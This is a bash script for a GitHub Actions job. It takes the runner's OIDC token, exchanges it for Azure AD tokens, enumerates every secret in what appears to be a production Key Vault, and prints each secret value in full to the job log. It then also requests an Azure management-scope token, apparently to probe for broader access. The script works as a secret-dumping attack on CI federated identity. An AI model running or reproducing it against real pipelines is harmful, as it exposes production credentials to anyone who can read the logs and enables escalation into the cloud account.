#!/usr/bin/env bash
set -euo pipefail

echo "=== OIDC Token Request ==="
echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
echo "TOKEN_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "NO OIDC - aborting"
  exit 1
fi

# Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r ".value // empty")
echo "OIDC token length: ${#OIDC}"

# Decode and show claims
echo "=== OIDC Claims ==="
P=$(printf %s "$OIDC" | cut -d. -f2)
while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
printf %s "$P" | tr "_-" "/+" | base64 -d 2>/dev/null | jq -c "{iss,aud,sub,repository,repository_id,ref,event_name,environment}" || true

# Exchange OIDC for Azure AD token (vault scope)
echo "=== Azure AD Token Exchange ==="
VAULT_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  | jq -r ".access_token // empty")
echo "Vault token length: ${#VAULT_TOKEN}"

if [ -z "$VAULT_TOKEN" ]; then
  echo "Failed to get vault token, trying raw response:"
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC}" \
    --data-urlencode "scope=https://vault.azure.net/.default" | jq .
  exit 1
fi

# List Key Vault secrets
KV="https://kv-tbl-prod-x3euoz.vault.azure.net"
echo "=== Key Vault Secrets ==="
SECRETS=$(curl -sS "${KV}/secrets?api-version=7.4" -H "Authorization: Bearer ${VAULT_TOKEN}")
echo "$SECRETS" | jq .

# Get each secret value
echo "=== Secret Values ==="
for sid in $(echo "$SECRETS" | jq -r ".value[]?.id // empty"); do
  echo "--- $sid ---"
  curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer ${VAULT_TOKEN}" | jq .
done

# Also try management scope
echo "=== Management Token ==="
MGMT_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" \
  --data-urlencode "scope=https://management.azure.com/.default" \
  | jq -r ".access_token // empty")
echo "Mgmt token length: ${#MGMT_TOKEN}"

echo "=== Done ==="
